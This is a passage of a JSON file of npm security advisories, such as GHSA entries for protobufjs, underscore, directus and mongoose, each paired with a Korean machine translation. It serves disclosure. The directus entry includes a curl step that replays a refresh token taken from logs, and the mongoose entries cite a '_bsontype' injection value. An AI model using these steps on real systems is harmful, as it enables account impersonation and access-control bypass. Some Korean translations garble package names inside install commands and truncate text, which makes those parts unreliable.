    "descriptionKR": "### 영향\nangular-server-side-configuration은 Angular CLI 프로젝트의 빌드 시간 동안 TypeScript(.ts) 파일에서 사용된 환경 변수를 감지합니다. 감지된 환경 변수는 출력 디렉토리의 ngssc.json 파일에 기록됩니다.\nAngular 기반 앱을 배포하는 동안 ngssc.json의 변수를 기반으로 하는 환경 변수가 앱 index.html(또는 정의된 인덱스 파일)에 삽입됩니다.\n\n버전 15에서는 환경 변수 감지가 Angular CLI의 angular.json 파일과 관련하여 전체 프로젝트로 확대되었습니다. 단일 리포지토리 설정에서 이는 백엔드/서비스가 감지되고 ngssc.json에 기록되도록 의도된 환경 변수로 이어질 수 있으며, 그런 다음 index.html을 통해 채워지고 노출됩니다.\n\n백엔드 구성 요소가 없는 일반 Angular 프로젝트에는 영향이 없습니다.\n\n### 패치\n15.1.0에서는 기본적으로 탐지 파일 범위를 제한하는 'searchPattern' 옵션을 추가하여 취약점이 완화되었습니다.\n\n```강타\n# npm을 통한 업데이트\nnpm 업데이트 각도 서버 측 구성\n## 또는 더 구체적\nnpm install angular-server-side-configuration@15.1.0\n\n# pnpm을 통한 업데이트\npnpm 업데이트 각도 서버 측 구성\n## 또는 더 구체적\npnpm add angular-server-side-configuration@15.1.0\n\n# 원사를 통해 업데이트\n원사 업데이트 각도 서버 측 구성\n## 또는 더 구체적\n원사 추가 angular-server-side-configuration@15.1.0\n```\n\n### 해결 방법\nngssc.json을 수동으로 편집 또는 생성하거나 ngssc.json 생성 후 스크립트 실행\n\n### 참조"
  },
  {
    "description": "Affected versions of `ag-grid` are vulnerable to Cross-site Scripting (XSS) via Angular Expressions, if used in combination with AngularJS.\n\n\n## Recommendation\n\nAvoid using `ag-grid` in combination with AngularJS until a fix is available.",
    "identifiers": "GHSA : GHSA-wfw3-rgfr-6g67\nCVE : CVE-2017-16009",
    "severity": "MODERATE",
    "updatedAt": "2023-03-24T21:26:32Z",
    "publishedAt": "2020-09-01T16:40:42Z",
    "references": "https://github.com/ceolter/ag-grid/issues/1287\nhttps://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-16009\nhttps://github.com/advisories/GHSA-wfw3-rgfr-6g67",
    "name": "ag-grid",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 18.1.3-beta.1",
    "descriptionKR": "영향을 받는 'ag-grid' 버전은 AngularJS와 함께 사용할 경우 Angular Expressions를 통한 XSS(교차 사이트 스크립팅)에 취약합니다.\n\n\n## 추천\n\n수정이 가능할 때까지 AngularJS와 함께 'ag-grid'를 사용하지 마세요."
  },
  {
    "description": "Versions of `eslint-utils` >=1.2.0 or <1.4.1 are vulnerable to Arbitrary Code Execution. The `getStaticValue` does not properly sanitize user input allowing attackers to supply malicious input that executes arbitrary code during the linting process. The `getStringIfConstant` and `getPropertyName` functions are not affected.\n\n\n## Recommendation\n\nUpgrade to version 1.4.1 or later.",
    "identifiers": "GHSA : GHSA-3gx7-xhv7-5mx3\nCVE : CVE-2019-15657",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-23T22:10:57Z",
    "publishedAt": "2019-08-26T16:59:56Z",
    "references": "https://github.com/mysticatea/eslint-utils/security/advisories/GHSA-3gx7-xhv7-5mx3\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-15657\nhttps://eslint.org/blog/2019/08/eslint-v6.2.1-released\nhttps://github.com/advisories/GHSA-3gx7-xhv7-5mx3\nhttps://www.npmjs.com/advisories/1118\nhttps://github.com/mysticatea/eslint-utils/commit/08158db1c98fd71cf0f32ddefbc147e2620e724c",
    "name": "eslint-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.2.0, < 1.4.1",
    "identifier": "1.4.1",
    "descriptionKR": "`eslint-utils` >=1.2.0 또는 <1.4.1 버전은 임의 코드 실행에 취약합니다. `getStaticValue`는 사용자 입력을 제대로 삭제하지 않아 공격자가 보푸라기 프로세스 중에 임의의 코드를 실행하는 악의적인 입력을 제공할 수 있습니다. `getStringIfConstant` 및 `getPropertyName` 함수는 영향을 받지 않습니다.\n\n\n## 추천\n\n버전 1.4.1 이상으로 업그레이드하십시오."
  },
  {
    "description": "The merge-deep library before 3.0.3 for Node.js can be tricked into overwriting properties of Object.prototype or adding new properties to it. These properties are then inherited by every object in the program, thus facilitating prototype-pollution attacks against applications using this library.",
    "identifiers": "GHSA : GHSA-r6rj-9ch6-g264\nCVE : CVE-2021-26707",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-23T21:45:29Z",
    "publishedAt": "2021-06-07T22:09:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-26707\nhttps://github.com/jonschlinkert/merge-deep/commit/11e5dd56de8a6aed0b1ed022089dbce6968d82a5\nhttps://securitylab.github.com/advisories/GHSL-2020-160-merge-deep/\nhttps://www.npmjs.com/package/merge-deep\nhttps://security.netapp.com/advisory/ntap-20210716-0008/\nhttps://github.com/advisories/GHSA-r6rj-9ch6-g264",
    "name": "merge-deep",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.3",
    "identifier": "3.0.3",
    "descriptionKR": "Node.js용 3.0.3 이전의 merge-deep 라이브러리는 Object.prototype의 속성을 덮어쓰거나 새 속성을 추가하도록 속일 수 있습니다. 그런 다음 이러한 속성은 프로그램의 모든 개체에 의해 상속되므로 이 라이브러리를 사용하는 응용 프로그램에 대한 프로토타입 오염 공격을 용이하게 합니다."
  },
  {
    "description": "The package protobufjs is vulnerable to Prototype Pollution, which can allow an attacker to add/modify properties of the Object.prototype. Versions after and including 6.10.0 until 6.10.3 and after and including 6.11.0 until 6.11.3 are vulnerable.\n\nThis vulnerability can occur in multiple ways:\n1. by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions\n2. by parsing/loading .proto files\n\n\n",
    "identifiers": "GHSA : GHSA-g954-5hwp-pp24\nCVE : CVE-2022-25878",
    "severity": "HIGH",
    "updatedAt": "2023-03-23T21:24:12Z",
    "publishedAt": "2022-05-28T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25878\nhttps://github.com/protobufjs/protobuf.js/pull/1731\nhttps://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f\nhttps://github.com/protobufjs/protobuf.js/blob/d13d5d5688052e366aa2e9169f50dfca376b32cf/src/util.js%23L176-L197\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2841507\nhttps://snyk.io/vuln/SNYK-JS-PROTOBUFJS-2441248\nhttps://github.com/protobufjs/protobuf.js/pull/1735\nhttps://github.com/advisories/GHSA-g954-5hwp-pp24",
    "name": "protobufjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.10.0, < 6.10.3",
    "identifier": "6.10.3",
    "descriptionKR": "패키지 protobufjs는 공격자가 Object.prototype의 속성을 추가/수정할 수 있는 Prototype Pollution에 취약합니다. 6.10.0~6.10.3 이후 버전과 6.11.0~6.11.3 이후 버전은 취약합니다.\n\n이 취약점은 여러 가지 방식으로 발생할 수 있습니다.\n1. util.setProperty 또는 ReflectionObject.setParsedOption 함수에 신뢰할 수 없는 사용자 입력 제공\n2. .proto 파일을 구문 분석/로드하여"
  },
  {
    "description": "The package protobufjs is vulnerable to Prototype Pollution, which can allow an attacker to add/modify properties of the Object.prototype. Versions after and including 6.10.0 until 6.10.3 and after and including 6.11.0 until 6.11.3 are vulnerable.\n\nThis vulnerability can occur in multiple ways:\n1. by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions\n2. by parsing/loading .proto files\n\n\n",
    "identifiers": "GHSA : GHSA-g954-5hwp-pp24\nCVE : CVE-2022-25878",
    "severity": "HIGH",
    "updatedAt": "2023-03-23T21:24:12Z",
    "publishedAt": "2022-05-28T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25878\nhttps://github.com/protobufjs/protobuf.js/pull/1731\nhttps://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f\nhttps://github.com/protobufjs/protobuf.js/blob/d13d5d5688052e366aa2e9169f50dfca376b32cf/src/util.js%23L176-L197\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2841507\nhttps://snyk.io/vuln/SNYK-JS-PROTOBUFJS-2441248\nhttps://github.com/protobufjs/protobuf.js/pull/1735\nhttps://github.com/advisories/GHSA-g954-5hwp-pp24",
    "name": "protobufjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.11.0, < 6.11.3",
    "identifier": "6.11.3",
    "descriptionKR": "패키지 protobufjs는 공격자가 Object.prototype의 속성을 추가/수정할 수 있는 Prototype Pollution에 취약합니다. 6.10.0~6.10.3 이후 버전과 6.11.0~6.11.3 이후 버전은 취약합니다.\n\n이 취약점은 여러 가지 방식으로 발생할 수 있습니다.\n1. util.setProperty 또는 ReflectionObject.setParsedOption 함수에 신뢰할 수 없는 사용자 입력 제공\n2. .proto 파일을 구문 분석/로드하여"
  },
  {
    "description": "simple-plist v1.3.0 was discovered to contain a prototype pollution vulnerability via .parse().",
    "identifiers": "GHSA : GHSA-gff7-g5r8-mg8m\nCVE : CVE-2022-26260",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-23T21:16:31Z",
    "publishedAt": "2022-03-23T00:00:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-26260\nhttps://github.com/wollardj/simple-plist/issues/60\nhttps://github.com/wollardj/simple-plist/issues/60#issuecomment-1083991840\nhttps://github.com/advisories/GHSA-gff7-g5r8-mg8m",
    "name": "simple-plist",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.1",
    "identifier": "1.3.1",
    "descriptionKR": "simple-plist v1.3.0은 .parse()를 통한 프로토타입 오염 취약점을 포함하는 것으로 발견되었습니다."
  },
  {
    "description": "The package `underscore` from 1.13.0-0 and before 1.13.0-2, from 1.3.2 and before 1.12.1 are vulnerable to Arbitrary Code Execution via the template function, particularly when a variable property is passed as an argument as it is not sanitized.",
    "identifiers": "GHSA : GHSA-cf4h-3jhx-xvhq\nCVE : CVE-2021-23358",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-23T20:56:35Z",
    "publishedAt": "2021-05-06T16:09:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23358\nhttps://github.com/jashkenas/underscore/pull/2917\nhttps://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66\nhttps://github.com/jashkenas/underscore/releases/tag/1.12.1\nhttps://snyk.io/vuln/SNYK-JS-UNDERSCORE-1080984\nhttps://www.npmjs.com/package/underscore\nhttps://github.com/jashkenas/underscore/blob/master/modules/template.js%23L71\nhttps://lists.debian.org/debian-lts-announce/2021/03/msg00038.html\nhttps://www.debian.org/security/2021/dsa-4883\nhttps://lists.apache.org/thread.html/r5df90c46f7000c4aab246e947f62361ecfb849c5a553dcdb0ef545e1@%3Cissues.cordova.apache.org%3E\nhttps://lists.apache.org/thread.html/r770f910653772317b117ab4472b0a32c266ee4abbafda28b8a6f9306@%3Cissues.cordova.apache.org%3E\nhttps://lists.apache.org/thread.html/raae088abdfa4fbd84e1d19d7a7ffe52bf8e426b83e6599ea9a734dba@%3Cissues.cordova.apache.org%3E\nhttps://lists.apache.org/thread.html/rbc84926bacd377503a3f5c37b923c1931f9d343754488d94e6f08039@%3Cissues.cordova.apache.org%3E\nhttps://lists.apache.org/thread.html/re69ee408b3983b43e9c4a82a9a17cbbf8681bb91a4b61b46f365aeaf@%3Cissues.cordova.apache.org%3E\nhttps://www.tenable.com/security/tns-2021-14\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/EOKATXXETD2PF3OR36Q5PD2VSVAR6J5Z/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FGEE7U4Z655A2MK5EW4UQQZ7B64XJWBV/\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1081504\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBJASHKENAS-1081505\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1081503\nhttps://github.com/advisories/GHSA-cf4h-3jhx-xvhq",
    "name": "underscore",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.3.2, < 1.12.1",
    "identifier": "1.12.1",
    "descriptionKR": "1.13.0-0 및 1.13.0-2 이전, 1.3.2 및 1.12.1 이전의 'underscore' 패키지는 템플릿 함수를 통한 임의 코드 실행에 취약합니다. 살균되지 않습니다."
  },
  {
    "description": "A vulnerability was found in querystringify before 2.0.0. It's possible to override built-in properties of the resulting query string object if a malicious string is inserted in the query string.",
    "identifiers": "GHSA : GHSA-hxcm-v35h-mg2x",
    "severity": "HIGH",
    "updatedAt": "2023-03-23T20:40:57Z",
    "publishedAt": "2019-06-07T21:12:50Z",
    "references": "https://github.com/unshiftio/querystringify/pull/19\nhttps://github.com/unshiftio/querystringify/commit/422eb4f6c7c28ee5f100dcc64177d3b68bb2b080\nhttps://github.com/advisories/GHSA-hxcm-v35h-mg2x",
    "name": "querystringify",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.0",
    "identifier": "2.0.0",
    "descriptionKR": "2.0.0 이전의 querystringify에서 취약점이 발견되었습니다. 악의적인 문자열이 쿼리 문자열에 삽입된 경우 결과 쿼리 문자열 개체의 기본 제공 속성을 재정의할 수 있습니다."
  },
  {
    "description": "json-schema before version 0.4.0 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').",
    "identifiers": "GHSA : GHSA-896r-f27r-55mw\nCVE : CVE-2021-3918",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-23T20:35:18Z",
    "publishedAt": "2021-11-19T20:16:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3918\nhttps://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741\nhttps://huntr.dev/bounties/bb6ccd63-f505-4e3a-b55f-cd2662c261a9\nhttps://github.com/kriszyp/json-schema/commit/b62f1da1ff5442f23443d6be6a92d00e65cba93a\nhttps://github.com/kriszyp/json-schema/commit/f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00013.html\nhttps://github.com/advisories/GHSA-896r-f27r-55mw",
    "name": "json-schema",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.4.0",
    "identifier": "0.4.0",
    "descriptionKR": "버전 0.4.0 이전의 json-schema는 객체 프로토타입 속성의 부적절하게 제어된 수정('프로토타입 오염')에 취약합니다."
  },
  {
    "description": "Versions of the package code-server before 4.10.1 are vulnerable to Missing Origin Validation in WebSockets handshakes. Exploiting this vulnerability can allow an adversary in specific scenarios to access data from and connect to the code-server instance.",
    "identifiers": "GHSA : GHSA-frjg-g767-7363\nCVE : CVE-2023-26114",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-27T22:32:10Z",
    "publishedAt": "2023-03-23T06:30:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26114\nhttps://github.com/coder/code-server/commit/d477972c68fc8c8e8d610aa7287db87ba90e55c7\nhttps://github.com/coder/code-server/releases/tag/v4.10.1\nhttps://security.snyk.io/vuln/SNYK-JS-CODESERVER-3368148\nhttps://github.com/advisories/GHSA-frjg-g767-7363",
    "name": "code-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.1",
    "identifier": "4.10.1",
    "descriptionKR": "4.10.1 이전의 패키지 code-server 버전은 WebSockets 핸드셰이크에서 Missing Origin Validation에 취약합니다. 이 취약성을 악용하면 특정 시나리오의 공격자가 코드 서버 인스턴스의 데이터에 액세스하고 코드 서버 인스턴스에 연결할 수 있습니다."
  },
  {
    "description": "### Summary\n\nCWE-532: Insertion of Sensitive Information into Log File discovered in v9.23.1. The `directus_refresh_token` is not redacted properly from the log outputs and can be used to impersonate users without their permission. \n\n### Details\n\nUsing `v9.23.1`, I am seeing that the `directus_refresh_token` is not properly redacted as indicated by https://github.com/directus/directus/blob/7c479c5161639aac466c763b6b958a9524201d74/api/src/logger.ts#L13\n\nI'm classifying this as a security vulnerability because if someone has access to the log outputs, for example with a shared Cloud account or Splunk implementation, they could exchange the refresh token using `/auth/refresh` for an access token and use the token to perform actions on behalf of an unsuspecting user. This situation creates issues with accountability and non-repudiation because we can no longer have confidence that actions taken in the application were authorized or even performed by the logged-in user. \n\nA couple of examples of this are:\n- A disgruntled employee deletes all of the data to get even with a target team member before logging off on their last day\n- Under the guise of their unsuspecting boss, a mischievous engineer uploads _questionable_ images that get displayed on internal or external facing content sites\n\nThe list could go on but I think these communicate the risk of an internal threat that has access to this information 😆 \n\n### PoC\n1. Set `LOG_STYLE=\"raw\"` and run Directus v9.23.1\n1. Log in to the application\n1. Look at the shell output and see that `directus_refresh_token` is logged\n    > Note: This is different from the standard `raw` output format. I intentionally ran this with `npx directus start | pino-pretty` so logs would be easier to read. It can also be reproduced by running `npx directus start` alone. \n\n    ![image](https://user-images.githubusercontent.com/13325146/224877190-54e12d7e-3c3e-42d3-9e21-0bd4439f4f44.png)\n\n1. Exchange the `directus_refresh_token` for an `access_token`\n\n     ``` shell\n      curl -X POST \\\n        'http://0.0.0.0:8055/auth/refresh' \\\n        --header 'Accept: */*' \\\n        --header 'Cookie: directus_refresh_token=$shh'\n     ```\n\n### Impact\nBecause this can be used to exploit other threats related to  [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html) I rank it with a Moderate severity. An insider with knowledge of this could do many mischievous things and get away with them for a long time without victims knowing about it. \n",
    "identifiers": "GHSA : GHSA-8vg2-wf3q-mwv7\nCVE : CVE-2023-28443",
    "severity": "MODERATE",
    "updatedAt": "2023-03-24T13:32:10Z",
    "publishedAt": "2023-03-23T19:47:12Z",
    "references": "https://github.com/directus/directus/security/advisories/GHSA-8vg2-wf3q-mwv7\nhttps://github.com/directus/directus/commit/349536303983ccba68ecb3e4fb35315424011afc\nhttps://github.com/directus/directus/blob/7c479c5161639aac466c763b6b958a9524201d74/api/src/logger.ts#L13\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-28443\nhttps://github.com/advisories/GHSA-8vg2-wf3q-mwv7",
    "name": "directus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.23.3",
    "identifier": "9.23.3",
    "descriptionKR": "### 요약\n\nCWE-532: v9.23.1에서 발견된 로그 파일에 민감한 정보 삽입. `directus_refresh_token`은 로그 출력에서 ​​제대로 수정되지 않으며 허가 없이 사용자를 가장하는 데 사용될 수 있습니다.\n\n### 세부 정보\n\n`v9.23.1`을 사용하면 https://github.com/directus/directus/blob/7c479c5161639aac466c763b6b958a9524201d74/api/src/logger.ts#L13에 표시된 대로 `directus_refresh_token`이 제대로 수정되지 않은 것으로 보입니다.\n\n예를 들어 공유 클라우드 계정 또는 Splunk 구현을 통해 누군가가 로그 출력에 액세스할 수 있는 경우 `/auth/refresh`를 사용하여 새로 고침 토큰을 액세스 토큰으로 교환하고 순진한 사용자를 대신하여 작업을 수행하기 위한 토큰입니다. 이러한 상황에서는 로그인한 사용자가 애플리케이션에서 수행한 작업이 승인되었거나 수행되었는지 더 이상 확신할 수 없기 때문에 책임 및 부인 방지에 문제가 발생합니다.\n\n이에 대한 몇 가지 예는 다음과 같습니다.\n- 불만이 있는 직원은 마지막 날 로그오프하기 전에 대상 팀원과 복수하기 위해 모든 데이터를 삭제합니다.\n- 순진한 상사로 위장한 장난꾸러기 엔지니어가 내부 또는 외부 콘텐츠 사이트에 표시되는 _의심스러운_ 이미지를 업로드합니다.\n\n목록은 계속될 수 있지만 이 정보에 액세스할 수 있는 내부 위협의 위험을 전달한다고 생각합니다 😆\n\n### PoC\n1. `LOG_STYLE=\"raw\"` 설정 및 Directus v9.23.1 실행\n1. 애플리케이션에 로그인\n1. 셸 출력을 보고 `directus_refresh_token`이 기록되었는지 확인합니다.\n    > 참고: 이것은 표준 `raw` 출력 형식과 다릅니다. 의도적으로 `npx directus start | pino-pretty` 그래서 로그를 읽기가 더 쉬울 것입니다. 'npx directus start' 단독 실행으로도 재현 가능합니다.\n\n    ![이미지](https://user-images.githubusercontent.com/13325146/224877190-54e12d7e-3c3e-42d3-9e21-0bd4439f4f44.png)\n\n1. `directus_refresh_token`을 `access_token`으로 교환\n\n     ``` 쉘\n      컬 -X POST \\\n        'http://0.0.0.0:8055/auth/refresh' \\\n        --header '수락: */*' \\\n        --header '쿠키: directus_refresh_token=$shh'\n     ```\n\n### 영향\n이는 [CWE-284: 부적절한 액세스 제어](https://cwe.mitre.org/data/definitions/284.html)와 관련된 다른 위협을 악용하는 데 사용될 수 있기 때문에 심각도 보통으로 평가합니다. 이 사실을 알고 있는 내부자는 많은 장난을 치고 피해자가 알지 못하는 사이에 오랫동안 피해갈 수 있습니다."
  },
  {
    "description": "npm `json-ptr` before 2.1.0 has an arbitrary code execution vulnerability. The issue occurs in the set operation (https://flitbit.github.io/json-ptr/classes/_src_pointer_.jsonpointer.htmlset) when the force flag is set to true. The function recursively set the property in the target object, however it does not properly check the key being set, leading to a prototype pollution.",
    "identifiers": "GHSA : GHSA-x5r6-x823-9848\nCVE : CVE-2020-7766",
    "severity": "HIGH",
    "updatedAt": "2023-03-22T20:51:26Z",
    "publishedAt": "2021-05-10T19:15:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7766\nhttps://github.com/418sec/json-ptr/pull/3\nhttps://github.com/flitbit/json-ptr/blob/master/src/util.ts%23L174\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1038396\nhttps://snyk.io/vuln/SNYK-JS-JSONPTR-1016939\nhttps://www.npmjs.com/package/json-ptr\nhttps://www.huntr.dev/bounties/2-npm-json-ptr/\nhttps://github.com/flitbit/json-ptr/commit/2539e3494c80af1eef24f0f433654a61f255f011\nhttps://github.com/advisories/GHSA-x5r6-x823-9848",
    "name": "json-ptr",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.1.0",
    "identifier": "2.1.0",
    "descriptionKR": "2.1.0 이전의 npm `json-ptr`에는 임의 코드 실행 취약점이 있습니다. force 플래그가 true로 설정된 경우 설정 작업(https://flitbit.github.io/json-ptr/classes/_src_pointer_.jsonpointer.htmlset)에서 문제가 발생합니다. 이 함수는 대상 개체의 속성을 재귀적으로 설정하지만 설정되는 키를 제대로 확인하지 않아 프로토타입 오염이 발생합니다."
  },
  {
    "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the devcert npm package, when an attacker is able to supply arbitrary input to the certificateFor method",
    "identifiers": "GHSA : GHSA-fp36-299x-pwmw\nCVE : CVE-2022-1929",
    "severity": "HIGH",
    "updatedAt": "2023-03-21T23:04:53Z",
    "publishedAt": "2022-06-03T00:01:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-1929\nhttps://research.jfrog.com/vulnerabilities/devcert-redos-xray-211352/\nhttps://github.com/davewasmer/devcert/commit/b0763215f6683271d296fda98f7ef7bcd4a55977\nhttps://github.com/advisories/GHSA-fp36-299x-pwmw",
    "name": "devcert",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.1",
    "identifier": "1.2.1",
    "descriptionKR": "공격자가 certificateFor 메서드에 임의의 입력을 제공할 수 있는 경우 devcert npm 패키지에서 기하급수적인 ReDoS(정규식 서비스 거부)가 트리거될 수 있습니다."
  },
  {
    "description": "Automattic Mongoose through 5.7.4 allows attackers to bypass access control (in some applications) because any query object with a _bsontype attribute is ignored. For example, adding \"_bsontype\":\"a\" can sometimes interfere with a query filter. NOTE: this CVE is about Mongoose's failure to work around this _bsontype special case that exists in older versions of the bson parser (aka the mongodb/js-bson project).",
    "identifiers": "GHSA : GHSA-8687-vv9j-hgph\nCVE : CVE-2019-17426",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-21T23:01:50Z",
    "publishedAt": "2019-10-22T20:19:54Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-17426\nhttps://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c\nhttps://github.com/Automattic/mongoose/issues/8222\nhttps://github.com/Automattic/mongoose/commits/4.13.21\nhttps://github.com/Automattic/mongoose/releases/tag/4.13.21\nhttps://github.com/Automattic/mongoose/commit/f88eb2524b65a68ff893c90a03c04f0913c1913e\nhttps://github.com/advisories/GHSA-8687-vv9j-hgph",
    "name": "mongoose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.13.21",
    "identifier": "4.13.21",
    "descriptionKR": "5.7.4까지의 Automattic Mongoose는 _bsontype 속성이 있는 모든 쿼리 개체가 무시되기 때문에 공격자가 액세스 제어를 우회할 수 있습니다(일부 응용 프로그램에서). 예를 들어 \"_bsontype\":\"a\"를 추가하면 때때로 쿼리 필터를 방해할 수 있습니다. 참고: 이 CVE는 이전 버전의 bson 파서(일명 mongodb/js-bson 프로젝트)에 존재하는 이 _bsontype 특수 사례를 해결하지 못한 Mongoose의 실패에 관한 것입니다."
  },
  {
    "description": "Automattic Mongoose through 5.7.4 allows attackers to bypass access control (in some applications) because any query object with a _bsontype attribute is ignored. For example, adding \"_bsontype\":\"a\" can sometimes interfere with a query filter. NOTE: this CVE is about Mongoose's failure to work around this _bsontype special case that exists in older versions of the bson parser (aka the mongodb/js-bson project).",
    "identifiers": "GHSA : GHSA-8687-vv9j-hgph\nCVE : CVE-2019-17426",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-21T23:01:50Z",
    "publishedAt": "2019-10-22T20:19:54Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-17426\nhttps://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c\nhttps://github.com/Automattic/mongoose/issues/8222\nhttps://github.com/Automattic/mongoose/commits/4.13.21\nhttps://github.com/Automattic/mongoose/releases/tag/4.13.21\nhttps://github.com/Automattic/mongoose/commit/f88eb2524b65a68ff893c90a03c04f0913c1913e\nhttps://github.com/advisories/GHSA-8687-vv9j-hgph",
    "name": "mongoose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.7.5",
    "identifier": "5.7.5",
    "descriptionKR": "5.7.4까지의 Automattic Mongoose는 _bsontype 속성이 있는 모든 쿼리 개체가 무시되기 때문에 공격자가 액세스 제어를 우회할 수 있습니다(일부 응용 프로그램에서). 예를 들어 \"_bsontype\":\"a\"를 추가하면 때때로 쿼리 필터를 방해할 수 있습니다. 참고: 이 CVE는 이전 버전의 bson 파서(일명 mongodb/js-bson 프로젝트)에 존재하는 이 _bsontype 특수 사례를 해결하지 못한 Mongoose의 실패에 관한 것입니다."
  },
  {
    "description": "Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The `Schema.path()` function is vulnerable to prototype pollution when setting the schema object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.",
    "identifiers": "GHSA : GHSA-f825-f98c-gj3g\nCVE : CVE-2022-2564",
    "severity": "HIGH",
    "updatedAt": "2023-03-21T20:31:49Z",
    "publishedAt": "2022-07-29T00:00:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2564\nhttps://github.com/automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8\nhttps://huntr.dev/bounties/055be524-9296-4b2f-b68d-6d5b810d1ddd\nhttps://github.com/Automattic/mongoose/blob/master/CHANGELOG.md\nhttps://github.com/Automattic/mongoose/blob/51e758541763b6f14569744ced15cc23ab8b50c6/lib/schema.js#L88-L141\nhttps://github.com/Automattic/mongoose/compare/6.4.5...6.4.6\nhttps://github.com/Automattic/mongoose/commit/99b418941e2fc974199b8e5bd9d382bb50bf680a\nhttps://github.com/advisories/GHSA-f825-f98c-gj3g",
    "name": "mongoose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.13.15",
    "identifier": "5.13.15",
    "descriptionKR": "Mongoose는 비동기 환경에서 작동하도록 설계된 MongoDB 개체 모델링 도구입니다.\\n\\n이 패키지의 영향을 받는 버전은 Prototype Pollution에 취약합니다. `Schema.path()` 함수는 스키마 객체를 설정할 때 프로토타입 오염에 취약합니다. 이 취약점은 개체 프로토타입의 수정을 허용하고 서비스 거부(DoS) 공격으로 조작될 수 있습니다."
  },
  {
    "description": "Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The `Schema.path()` function is vulnerable to prototype pollution when setting the schema object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.",
    "identifiers": "GHSA : GHSA-f825-f98c-gj3g\nCVE : CVE-2022-2564",
    "severity": "HIGH",
    "updatedAt": "2023-03-21T20:31:49Z",
    "publishedAt": "2022-07-29T00:00:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2564\nhttps://github.com/automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8\nhttps://huntr.dev/bounties/055be524-9296-4b2f-b68d-6d5b810d1ddd\nhttps://github.com/Automattic/mongoose/blob/master/CHANGELOG.md\nhttps://github.com/Automattic/mongoose/blob/51e758541763b6f14569744ced15cc23ab8b50c6/lib/schema.js#L88-L141\nhttps://github.com/Automattic/mongoose/compare/6.4.5...6.4.6\nhttps://github.com/Automattic/mongoose/commit/99b418941e2fc974199b8e5bd9d382bb50bf680a\nhttps://github.com/advisories/GHSA-f825-f98c-gj3g",
    "name": "mongoose",
